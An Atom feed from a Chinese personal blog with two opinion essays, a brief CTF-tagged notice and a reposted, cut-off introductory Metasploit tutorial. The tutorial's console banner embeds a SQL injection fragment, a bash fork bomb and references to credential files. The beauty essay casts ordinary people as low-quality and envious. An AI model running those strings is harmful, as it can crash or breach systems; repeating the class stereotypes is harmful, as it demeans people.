<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JiangnanPsalter</title>
  
  <subtitle>江南大小姐</subtitle>
  <link href="http://jiangnanpsalter.com/atom.xml" rel="self"/>
  
  <link href="http://jiangnanpsalter.com/"/>
  <updated>2024-06-03T14:51:09.792Z</updated>
  <id>http://jiangnanpsalter.com/</id>
  
  <author>
    <name>JiangnanPsalter</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>行业特征与个人形象：影响后代的无形遗产</title>
    <link href="http://jiangnanpsalter.com/2024/06/03/%E8%A1%8C%E4%B8%9A%E7%89%B9%E5%BE%81%E4%B8%8E%E4%B8%AA%E4%BA%BA%E5%BD%A2%E8%B1%A1%EF%BC%9A%E5%BD%B1%E5%93%8D%E5%90%8E%E4%BB%A3%E7%9A%84%E6%97%A0%E5%BD%A2%E9%81%97%E4%BA%A7/"/>
    <id>http://jiangnanpsalter.com/2024/06/03/%E8%A1%8C%E4%B8%9A%E7%89%B9%E5%BE%81%E4%B8%8E%E4%B8%AA%E4%BA%BA%E5%BD%A2%E8%B1%A1%EF%BC%9A%E5%BD%B1%E5%93%8D%E5%90%8E%E4%BB%A3%E7%9A%84%E6%97%A0%E5%BD%A2%E9%81%97%E4%BA%A7/</id>
    <published>2024-06-03T14:39:51.505Z</published>
    <updated>2024-06-03T14:51:09.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="行业特征与个人形象：影响后代的无形遗产"><a href="#行业特征与个人形象：影响后代的无形遗产" class="headerlink" title="行业特征与个人形象：影响后代的无形遗产"></a>行业特征与个人形象：影响后代的无形遗产</h1><p>在历史的长河中，我们不难发现，同一行业中的人们往往具有类似的特征，无论是生活习惯、思维模式、行为模式，还是长相。这种现象不仅在古代有所体现，在现代社会中也同样存在。例如，在互联网领域取得成就的人，往往拥有高颜值和高智感。这种特征的相似性，无疑影响了后人对该行业的认知和选择。</p><p>首先，我们生活的每一个细节都至关重要。我们需要认真挑选自己使用的物品，认真做好自己的事情，确保自己的行为、长相和穿搭符合我们理想目标的模式。例如，如果我们的目标是成为一名白领，那么我们就应该穿着职场化，并付出相应的努力。这种看似微不足道的行为，实际上在潜移默化中影响了我们的形象，也影响了后人的选择。</p><p>其次，我们的形象和成就不仅关乎自己，更关乎我们的后代。我们的行为和努力，会在无意中成为后代参考的模板。如果我们希望他们能够走向成功的道路，那么我们就必须以身作则，努力做到最好。正如古代典故中所言，“龙生龙，凤生凤”，我们的形象和成就，将会成为后代选择行业的无形遗产。为了后代，我们更要认真对待自己的事情，努力做到最好。这是因为，我们的后代会根据我们的成绩、形象和职业来判断自己的发展方向。例如，如果某位条件与我们极其相似的后辈发现我们是一位成功的企业家，他们可能会受到启发，立志成为优秀的企业家。这种刻板印象虽然有时会限制个体的多元化发展，但在很大程度上也起到了传承和激励的作用。</p><p>在我国古代，有许多典故都传达了这一观点。诸如“孟母三迁”的故事，孟母为了让儿子孟子成为一个有道德、有文化的人，不惜三次搬家，最终使孟子在良好的环境下成长为一个杰出的思想家。又如“岳飞背刺字”，岳母在岳飞背上刺下“精忠报国”的字样，激发了他为国家效忠奋斗的勇气和决心。这些典故都说明了我们的长辈为了后代的发展，会尽全力为他们创造一个良好的环境，树立榜样，使我们能够传承他们的优秀品质。</p><p>最后，我们应当忽略他人的评价，坚定地做好自己的事情。因为我们的每一个细节，都可能在无形中影响后代的决策。如果我们希望他们能够拥有更好的未来，那么我们就必须用自己的行动，为他们树立一个榜样。</p><p>总之，我们应当认识到，行业特征和个人形象之间的关联，以及这种关联对后代的影响。只有通过努力做好自己，才能为后代留下一个更好的未来。在这个过程中，我们不仅是在塑造自己的命运，更是在塑造后代的未来。因此，让我们怀着责任感和使命感，认真对待自己的事情，为后代创造一个更加美好的世界。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;行业特征与个人形象：影响后代的无形遗产&quot;&gt;&lt;a href=&quot;#行业特征与个人形象：影响后代的无形遗产&quot; class=&quot;headerlink&quot; title=&quot;行业特征与个人形象：影响后代的无形遗产&quot;&gt;&lt;/a&gt;行业特征与个人形象：影响后代的无形遗产&lt;/h1&gt;&lt;p&gt;在历</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://jiangnanpsalter.com/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>美貌与权益：社会层次差异下的现象解读</title>
    <link href="http://jiangnanpsalter.com/2024/06/03/%E7%BE%8E%E8%B2%8C%E4%B8%8E%E6%9D%83%E7%9B%8A%EF%BC%9A%E7%A4%BE%E4%BC%9A%E5%B1%82%E6%AC%A1%E5%B7%AE%E5%BC%82%E4%B8%8B%E7%9A%84%E7%8E%B0%E8%B1%A1%E8%A7%A3%E8%AF%BB/"/>
    <id>http://jiangnanpsalter.com/2024/06/03/%E7%BE%8E%E8%B2%8C%E4%B8%8E%E6%9D%83%E7%9B%8A%EF%BC%9A%E7%A4%BE%E4%BC%9A%E5%B1%82%E6%AC%A1%E5%B7%AE%E5%BC%82%E4%B8%8B%E7%9A%84%E7%8E%B0%E8%B1%A1%E8%A7%A3%E8%AF%BB/</id>
    <published>2024-06-03T14:37:02.615Z</published>
    <updated>2024-06-03T14:39:24.359Z</updated>
    
    <content type="html"><![CDATA[<h1 id="美貌与权益：社会层次差异下的现象解读"><a href="#美貌与权益：社会层次差异下的现象解读" class="headerlink" title="美貌与权益：社会层次差异下的现象解读"></a>美貌与权益：社会层次差异下的现象解读</h1><h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p>美貌，作为一种天生的特质，在不同社会环境下会引发截然不同的待遇。在市井之中，美貌往往成为攻击的对象，而在上层阶级，美貌却能带来权益和保护。本文将围绕这一现象展开论述。</p><p>在我们所生活的这个纷繁复杂的世界里，美貌，这个看似无足轻重的特质，却在不经意间扮演着极其重要的角色。它如同一位悄悄渗透进社会各个角落的神秘力量，悄然改变着我们的命运。然而，美貌的魔力并非无处不在，它在不同的社会层次中，引发出截然相反的效应。</p><p>首先，让我们把目光投向市井之中。在那里，美貌仿佛变成了一种罪过。市井小民们普遍素质较低，文化程度不高，对自己要求也不高。在这样的环境下，美貌成为了被攻击的对象。人们往往因为嫉妒或者无知，将美丽的存在视为威胁，进而对其进行攻击。这种对美貌的敌意，无疑让美丽的存在变得痛苦和尴尬。</p><p>然而，转向上层社会的玄门，我们会看到一幅截然不同的画面。在这里，美貌成为了一种珍贵的资源，人们普遍素质较高，文化底蕴深厚。他们更加尊重美丽的女士，甚至愿意为了将美丽的女士占为己有而展开争夺和竞争。美丽的人因此拥有了权力和力量，她们的存在成为了社会地位和身份的象征。</p><p>但是，我们必须要认识到，无论是市井还是玄门，都只是社会的一个缩影。我们不能将社会的复杂性简化为二。美丽的聪慧的人更要向上走，不仅是美丽的人，只要是人，都应该追求更高的层次。正如俗话说得好：“水往低处流，人往高处走。”这是自然规律，也是我们每个人应该追求的目标。</p><p>最后，我想提醒人们，不要将玄门看作是市井。玄门就是玄门，它代表着社会的上层建筑，是人们追求美好生活的地方。我们应该以更高的标准要求自己，追求内心的美，不断提升自己的素质和能力，从而在社会的舞台上崭露头角。</p><p>总的来说，美貌在不同社会层次中的待遇差异，揭示了社会的不公与多样性。我们应该正视这一现象，不仅要追求外表的美，更要注重内心的修养，以更为宽广的视野看待人生，追求更高层次的人生目标。</p><h2 id="二、美貌在市井与上层阶级的待遇差异"><a href="#二、美貌在市井与上层阶级的待遇差异" class="headerlink" title="二、美貌在市井与上层阶级的待遇差异"></a>二、美貌在市井与上层阶级的待遇差异</h2><p>1.市井之中，人民普遍素质较低，文化程度不高，对自己要求亦不高。这种环境下，美貌成了市井小民攻击的对象，被视为“罪过”。</p><p>2.在上层社会的玄门之中，人民素质较高，文化底蕴丰厚。这里的群体更加尊重美丽的女士，美貌的人因此拥有了权力和力量。</p><h2 id="三、聪慧的美貌人士如何应对并向更高层次发展"><a href="#三、聪慧的美貌人士如何应对并向更高层次发展" class="headerlink" title="三、聪慧的美貌人士如何应对并向更高层次发展"></a>三、聪慧的美貌人士如何应对并向更高层次发展</h2><p>1.美丽的聪慧人士应当意识到，向上走不仅是美丽的人的需要，更是所有人的自然追求。正如俗话所说：“水往低处流，人往高处走。”</p><p>2.在面对市井与上层阶级的差异时，聪慧的美貌人士应保持自尊，坚定信念，不受外界负面评价的影响。</p><p>3.借助美貌所带来的优势，聪慧的美貌人士应当奋发向前，不断提高自己的综合素质，追求更高层次的人生目标。</p><h2 id="四、结论"><a href="#四、结论" class="headerlink" title="四、结论"></a>四、结论</h2><p>美貌在不同社会层次中的待遇差异，揭示了社会的不公与多样性。聪慧的美貌人士应把握机遇，积极向上，追求更高层次的人生。同时，我们应认识到，美貌并非决定一个人价值的唯一标准，内在品质和能力同样重要。在追求美的过程中，我们要跳出市井与上层阶级的界限，以更为宽广的视野看待人生。</p><p>总之，美貌在不同社会环境中的待遇差异是一个值得关注的现象。通过分析这一现象，我们可以更好地理解社会层次差异下的美貌观念，并为聪慧的美貌人士提供启示。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;美貌与权益：社会层次差异下的现象解读&quot;&gt;&lt;a href=&quot;#美貌与权益：社会层次差异下的现象解读&quot; class=&quot;headerlink&quot; title=&quot;美貌与权益：社会层次差异下的现象解读&quot;&gt;&lt;/a&gt;美貌与权益：社会层次差异下的现象解读&lt;/h1&gt;&lt;h2 id=&quot;一</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://jiangnanpsalter.com/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>Notice on Establishing the JiangnanPsalter Secret Affairs Office</title>
    <link href="http://jiangnanpsalter.com/2024/05/06/Notice%20on%20Establishing%20the%20JiangnanPsalter%20Secret%20Affairs%20Office/"/>
    <id>http://jiangnanpsalter.com/2024/05/06/Notice%20on%20Establishing%20the%20JiangnanPsalter%20Secret%20Affairs%20Office/</id>
    <published>2024-05-06T08:35:26.142Z</published>
    <updated>2024-05-06T08:35:38.324Z</updated>
    
    <content type="html"><![CDATA[<h1 id="有关建立江南诗诗密事处的通知"><a href="#有关建立江南诗诗密事处的通知" class="headerlink" title="有关建立江南诗诗密事处的通知"></a>有关建立江南诗诗密事处的通知</h1><h1 id="Notice-on-Establishing-the-JiangnanPsalter-Secret-Affairs-Office"><a href="#Notice-on-Establishing-the-JiangnanPsalter-Secret-Affairs-Office" class="headerlink" title="Notice on Establishing the JiangnanPsalter Secret Affairs Office"></a>Notice on Establishing the JiangnanPsalter Secret Affairs Office</h1><h2 id="模组包括："><a href="#模组包括：" class="headerlink" title="模组包括："></a>模组包括：</h2><h2 id="The-module-includes"><a href="#The-module-includes" class="headerlink" title="The module includes:"></a>The module includes:</h2><p>硬件控制；</p><p>Hardware control;</p><p>解密；</p><p>Decryption;</p><p>数学控制论；</p><p>Mathematical control theory;</p><p>调动分布。<br>Mobilize distribution.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;有关建立江南诗诗密事处的通知&quot;&gt;&lt;a href=&quot;#有关建立江南诗诗密事处的通知&quot; class=&quot;headerlink&quot; title=&quot;有关建立江南诗诗密事处的通知&quot;&gt;&lt;/a&gt;有关建立江南诗诗密事处的通知&lt;/h1&gt;&lt;h1 id=&quot;Notice-on-Establi</summary>
      
    
    
    
    <category term="通知与公示" scheme="http://jiangnanpsalter.com/categories/%E9%80%9A%E7%9F%A5%E4%B8%8E%E5%85%AC%E7%A4%BA/"/>
    
    
    <category term="CTF" scheme="http://jiangnanpsalter.com/tags/CTF/"/>
    
    <category term="ACM" scheme="http://jiangnanpsalter.com/tags/ACM/"/>
    
    <category term="OI" scheme="http://jiangnanpsalter.com/tags/OI/"/>
    
    <category term="MONSOON" scheme="http://jiangnanpsalter.com/tags/MONSOON/"/>
    
    <category term="JiangnanPsalter" scheme="http://jiangnanpsalter.com/tags/JiangnanPsalter/"/>
    
  </entry>
  
  <entry>
    <title>使用METASPLOIT框架</title>
    <link href="http://jiangnanpsalter.com/2024/05/06/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/"/>
    <id>http://jiangnanpsalter.com/2024/05/06/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/</id>
    <published>2024-05-06T08:34:31.642Z</published>
    <updated>2024-05-06T08:34:54.699Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文来源：<a href="https://zengqi0.github.io/2023/04/23/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/">https://zengqi0.github.io/2023/04/23/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工具最近在安全行业的社交媒体圈内引起了激烈的争论。一些讨论围绕某些群体的个人偏好展开，而另一些则旨在评估向公众公开工具的政策。然而，有必要指出自动化工具在当今行业中的重要性。</p><p>我们确实听到或将要听到的普遍意见是，在安全评估期间使用自动化工具不是正确的选择。这是因为在与易受攻击的环境交互时，它们无法为安全分析师或渗透测试人员提供“证明”自己的机会。此外，许多人表示，工具使审核员的工作变得过于简单，以至于他们的评估无法获得任何认可。</p><p>另一个声音团体不同意 - 那些由信息安全社区的新成员组成的，他们刚刚开始并迈出他们的第一步，以及那些坚持认为工具通过为我们提供对过多的用户更友好的方法来帮助我们更好地学习的论点存在于野外的漏洞，同时为我们节省了评估更复杂部分的时间。我们也将采取这种对抗性的方式来处理这个问题。</p><p>在某些情况下，工具确实会给我们带来一些缺点：</p><ul><li>创建一个难以突破的舒适区来学习新技能</li><li>仅仅因为它们在线发布供所有人查看和使用而造成安全风险</li><li>营造隧道视觉效果。<code>If the tool cannot do it, neither can I.</code></li></ul><p>​就像在工作的创造性部分可以与自动化任务相结合的其他行业一样，工具可以限制我们作为新用户的观点和行动。我们可能错误地认为<code>learn</code>它们提供了所有问题的解决方案，我们开始越来越依赖它们。反过来，这会产生一种隧道视觉效果，这种效果可以而且将会限制用户可能会考虑并采取行动进行评估的可能交互。</p><p>​与此同时，越来越多的这些自动化工具进入公共部门（参见美国国家安全局向公众发布安全工具）这一事实为几乎不了解这些工具的潜在恶意行为者创造了更多可能性行业根据他们快速获利的愿望采取行动，或者在充满小人物的黑暗房间里炫耀他们的努力。</p><h2 id="纪律"><a href="#纪律" class="headerlink" title="纪律"></a>纪律</h2><p>如果要从信息安全行业的当前状态中得出任何有辨识力的因素，则必须在我们处于现有技术、协议和系统的持续、加速演进的前提下得出这些因素。由于我们在评估期间遇到大量环境变量，因此必须尽可能节省时间，并为审核员形成强大的安全范例。纪律在所有工作领域都至关重要，结论如下：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>我们将永远没有足够的时间来完成评估。由于在每一种环境变化中使用的技术数量众多，我们将没有时间进行完整、全面的评估。时间就是金钱，我们为不懂技术的客户加班加点，我们需要先完成大部分工作：最具潜在影响和修复周转率最高的问题。</td></tr><tr><td>即使我们制作工具或手动利用每项服务，可信度也可能成为问题。我们不是与其他行业成员竞争，而是与客户管理层预先设定的经济条件和个人信念竞争。他们不会理解或非常重视荣誉。他们只希望在最短的时间内完成尽可能多的工作。</td></tr><tr><td>您只需要打动自己，而不是信息安全社区。如果我们做到了前者，后者自然会到来。使用与上述相同的示例，许多在线存在的艺术家在追求在线验证时偏离了最初的目标。他们的艺术对于敏锐的眼睛来说变得陈旧和普通，但对于日常用户来说，它包含了他们想要的视觉元素和主题，而不是那些他们的追随者还不知道他们想要的。作为安全研究人员或渗透测试人员，我们只需要验证漏洞，而不是验证我们的自我。</td></tr></tbody></table><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>我们必须从内到外分析和了解我们的工具，以保持我们的踪迹并避免在评估期间发生灾难性事件。许多工具可以证明是不可预测的。有些可能会在目标系统上留下活动痕迹，有些可能会让我们的攻击者平台敞开大门。尽管如此，只要我们遵守此处的规则，它们就可以成为初学者的宝贵教育平台，以及专业人士所需的节省时间的机制。</p><p>不要有隧道视野。将该工具用作工具，而不是我们完整评估的支柱或生命支持。</p><p>请阅读您可以找到的有关我们任何工具的所有技术文档。请深入了解他们。千方百计（或函数或类）。这将帮助我们避免意外行为或愤怒的客户和律师团队。</p><p>假设我们审核我们的工具并为自己设置一个可靠的方法来进行初步检查和攻击路径。在这种情况下，工具将为我们节省进一步研究和对我们的安全研究范式进行长期具体探索的时间。考虑到越来越多的技术出现在当今环境中的速度越来越快，这项进一步的研究应该侧重于对安全机制的更深入理解，进一步对更抽象的安全对象进行审计，以扩大分析范围。这就是我们作为专业人士的发展方式。</p><h1 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a>Metasploit简介</h1><p>​这<code>Metasploit Project</code>是一个基于 Ruby 的模块化渗透测试平台，使您能够编写、测试和执行漏洞利用代码。该漏洞利用代码可以由用户定制，也可以从包含已发现的最新模块化漏洞利用的数据库中获取。其中<code>Metasploit Framework</code>包括一套工具，可用于测试安全漏洞、枚举网络、执行攻击和逃避检测。其核心<code>Metasploit Project</code>是一组常用工具，为渗透测试和漏洞利用开发提供了完整的环境。</p><p><img src="/img/METASPLOIT1.png"></p><p>​提到<code>modules</code>的是实际的漏洞利用概念验证，已经在野外开发和测试并集成在框架内，以便渗透测试人员可以轻松访问针对不同平台和服务的不同攻击向量。Metasploit 不是万事通，而是一把瑞士军刀，其工具足以帮助我们解决最常见的未修补漏洞。</p><p>​它的强项在于它提供了大量可用的目标和版本，所有这些都离成功的立足点很远。这些，结合为那些易受攻击的版本量身定制的漏洞利用以及在漏洞利用后发送的有效负载，这将使我们能够实际访问系统，为我们提供了一种简单、自动化的方式来在我们的帖子期间在目标连接之间切换- 开发企业。</p><h2 id="Metasploit-Pro"><a href="#Metasploit-Pro" class="headerlink" title="Metasploit Pro"></a>Metasploit Pro</h2><p><code>Metasploit</code>作为一个产品分为两个版本。该<code>Metasploit Pro</code>版本与具有一些附加功能的版本不同<code>Metasploit Framework</code>：</p><ul><li>任务链</li><li>社会工程学</li><li>漏洞验证</li><li>图形用户界面</li><li>快速启动向导</li><li>集成</li></ul><p>如果您更喜欢命令行用户并且更喜欢额外的功能，那么专业版还包含自己的控制台，就像<code>msfconsole</code>.</p><p>要大致了解 Metasploit Pro 的最新功能可以实现什么，请查看以下列表：</p><table><thead><tr><th><strong>浸润</strong></th><th><strong>收集数据</strong></th><th><strong>修复</strong></th></tr></thead><tbody><tr><td>手动开发</td><td>导入和扫描数据</td><td>暴力破解</td></tr><tr><td>防病毒规避</td><td>发现扫描</td><td>任务链</td></tr><tr><td>IPS&#x2F;IDS规避</td><td>元模块</td><td>开发工作流程</td></tr><tr><td>代理枢轴</td><td>Nexpose 扫描集成</td><td>会话重新运行</td></tr><tr><td>开发后</td><td></td><td>任务回放</td></tr><tr><td>会话清理</td><td></td><td>项目声纳集成</td></tr><tr><td>凭据重用</td><td></td><td>会话管理</td></tr><tr><td>社会工程学</td><td></td><td>凭证管理</td></tr><tr><td>有效载荷生成器</td><td></td><td>团队协作</td></tr><tr><td>快速渗透测试</td><td></td><td>网络界面</td></tr><tr><td>VPN 枢轴</td><td></td><td>备份还原</td></tr><tr><td>漏洞验证</td><td></td><td>数据导出</td></tr><tr><td>网络钓鱼向导</td><td></td><td>证据收集</td></tr><tr><td>网络应用测试</td><td></td><td>报告</td></tr><tr><td>持久会话</td><td></td><td>标记数据</td></tr></tbody></table><h2 id="Metasploit-框架控制台"><a href="#Metasploit-框架控制台" class="headerlink" title="Metasploit 框架控制台"></a>Metasploit 框架控制台</h2><p>可能<code>msfconsole</code>是最流行的<code>Metasploit Framework</code> <code>(MSF)</code>. 它提供了一个“一体式”集中式控制台，并允许您高效地访问<code>MSF</code>. <code>Msfconsole</code>一开始可能看起来很吓人，但是一旦您了解了命令的语法，您就会学会欣赏使用此界面的强大功能。</p><p>一般带来的功能<code>msfconsole</code>有以下几点：</p><ul><li>这是访问其中大部分功能的唯一受支持的方式<code>Metasploit</code></li><li>提供基于控制台的界面<code>Framework</code></li><li>包含最多的功能，是最稳定的<code>MSF</code>界面</li><li>完整的 readline 支持、制表符和命令完成</li><li>执行外部命令<code>msfconsole</code></li></ul><p>上述两种产品都带有一个广泛的可用模块数据库，可用于我们的评估。这些与外部命令（如扫描器、社会工程工具包和有效负载生成器）的使用相结合，可以将我们的设置变成一个随时可用的机器，使我们能够通过使用无缝地控制和操纵野外的不同漏洞会话和作业的方式与我们在 Internet 浏览器上看到选项卡的方式相同。</p><p>这里的关键术语是可用性——用户体验。我们可以轻松控制控制台可以改善我们的学习体验。因此，让我们深入研究细节。</p><h2 id="了解架构"><a href="#了解架构" class="headerlink" title="了解架构"></a>了解架构</h2><p>要完全操作我们正在使用的任何工具，我们必须首先了解它的内部结构。这是一种很好的做法，它可以让我们更好地了解当该工具发挥作用时我们的安全评估过程中会发生什么。重要的是不要使用<a href="https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-reported/">任何可能使您或您的客户面临数据泄露风险的通配符</a>。</p><p><code>/usr/share/metasploit-framework</code>默认情况下，所有与 Metasploit Framework 相关的基础文件都可以在我们的发行版中找到<code>ParrotOS Security</code>。</p><h4 id="数据、文档、库"><a href="#数据、文档、库" class="headerlink" title="数据、文档、库"></a>数据、文档、库</h4><p>这些是框架的基础文件。Data 和 Lib 是 msfconsole 界面的功能部分，而 Documentation 文件夹包含有关该项目的所有技术细节。</p><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p>上面详述的模块在此文件夹中分为不同的类别。我们将在下一节中详细介绍这些内容。它们包含在以下文件夹中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/modules</span><br><span class="line"></span><br><span class="line">auxiliary  encoders  evasion  exploits  nops  payloads  post</span><br></pre></td></tr></table></figure><h4 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h4><p>插件在使用时为渗透测试人员提供了更大的灵活性，<code>msfconsole</code>因为它们可以根据需要轻松地手动或自动加载，以在我们的评估期间提供额外的功能和自动化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/</span><br><span class="line"></span><br><span class="line">aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb</span><br><span class="line">alias.rb           komand.rb      pcap_log.rb          sqlmap.rb</span><br><span class="line">auto_add_route.rb  lab.rb         request.rb           thread.rb</span><br><span class="line">beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb</span><br><span class="line">db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb</span><br><span class="line">db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb</span><br><span class="line">event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb</span><br><span class="line">ffautoregen.rb     nexpose.rb     socket_logger.rb</span><br></pre></td></tr></table></figure><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>Meterpreter 功能和其他有用的脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/</span><br><span class="line"></span><br><span class="line">meterpreter  ps  resource  shell</span><br></pre></td></tr></table></figure><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>可以直接从菜单调用的命令行实用程序<code>msfconsole</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/tools/</span><br><span class="line"></span><br><span class="line">context  docs     hardware  modules   payloads</span><br><span class="line">dev      exploit  memdump   password  recon</span><br></pre></td></tr></table></figure><p>现在我们知道了所有这些位置，当我们决定导入新模块甚至从头开始创建新模块时，我们将来可以很容易地引用它们。</p><h2 id="MSF控制台简介"><a href="#MSF控制台简介" class="headerlink" title="MSF控制台简介"></a>MSF控制台简介</h2><p>要开始与 Metasploit Framework 交互，我们需要输入<code>msfconsole</code>我们选择的终端。许多面向安全的发行版（例如 Parrot Security 和 Kali Linux）都预装了<code>msfconsole</code>。与任何其他命令行工具一样，我们可以在启动脚本时使用其他几个选项。这些从图形显示开关&#x2F;选项到程序开关&#x2F;选项不等。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>启动后<code>msfconsole</code>，我们会看到他们创造的启动画面和命令行提示符，等待我们的第一个命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">nswer77@htb[/htb]$ msfconsole</span><br><span class="line">                                                  </span><br><span class="line">                                              `:oDFo:`                            </span><br><span class="line">                                           ./ymM0dayMmy/.                          </span><br><span class="line">                                        -+dHJ5aGFyZGVyIQ==+-                    </span><br><span class="line">                                    `:sm⏣~~Destroy.No.Data~~s:`                </span><br><span class="line">                                 -+h2~~Maintain.No.Persistence~~h+-              </span><br><span class="line">                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          </span><br><span class="line">                          ./etc/shadow.0days-Data&#x27;%20OR%201=1--.No.0MN8&#x27;/.      </span><br><span class="line">                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    </span><br><span class="line">                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  </span><br><span class="line">                      :dopeAW.No&lt;nano&gt;o                     :is:TЯiKC.sudo-.A:  </span><br><span class="line">                      :we&#x27;re.all.alike&#x27;`                     The.PFYroy.No.D7:  </span><br><span class="line">                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    </span><br><span class="line">                      :msf&gt;exploit -j.                       :Ns.BOB&amp;ALICEes7:    </span><br><span class="line">                      :---srwxrwx:-.`                        `MS146.52.No.Per:    </span><br><span class="line">                      :&lt;script&gt;.Ac816/                        sENbove3101.404:    </span><br><span class="line">                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    </span><br><span class="line">                      :09.14.2011.raid                       /STFU|wall.No.Pr:    </span><br><span class="line">                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    </span><br><span class="line">                      :#OUTHOUSE-  -s:                       /corykennedyData:    </span><br><span class="line">                      :$nmap -oS                              SSo.6178306Ence:    </span><br><span class="line">                      :Awsm.da:                            /shMTl#beats3o.No.:    </span><br><span class="line">                      :Ring0:                             `dDestRoyREXKC3ta/M:    </span><br><span class="line">                      :23d:                               sSETEC.ASTRONOMYist:    </span><br><span class="line">                       /-                        /yo-    .ence.N:()&#123; :|: &amp; &#125;;:    </span><br><span class="line">                                                 `:Shall.We.Play.A.Game?tron/    </span><br><span class="line">                                                 ```-ooy.if1ghtf0r+ehUser5`    </span><br><span class="line">                                               ..th3.H1V3.U2VjRFNN.jMh+.`          </span><br><span class="line">                                              `MjM~~WE.ARE.se~~MMjMs              </span><br><span class="line">                                               +~KANSAS.CITY&#x27;s~-`                  </span><br><span class="line">                                                J~HAKCERS~./.`                    </span><br><span class="line">                                                .esc:wq!:`                        </span><br><span class="line">                                                 +++ATH`                            </span><br><span class="line">                                                  `</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.9-dev                           ]</span><br><span class="line">+ -- --=[ 2169 exploits - 1149 auxiliary - 398 post       ]</span><br><span class="line">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Use sessions -1 to interact with the last opened session</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure><p>或者，我们可以使用<code>-q</code>不显示横幅的选项。</p><p> 启动 MSF 控制台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 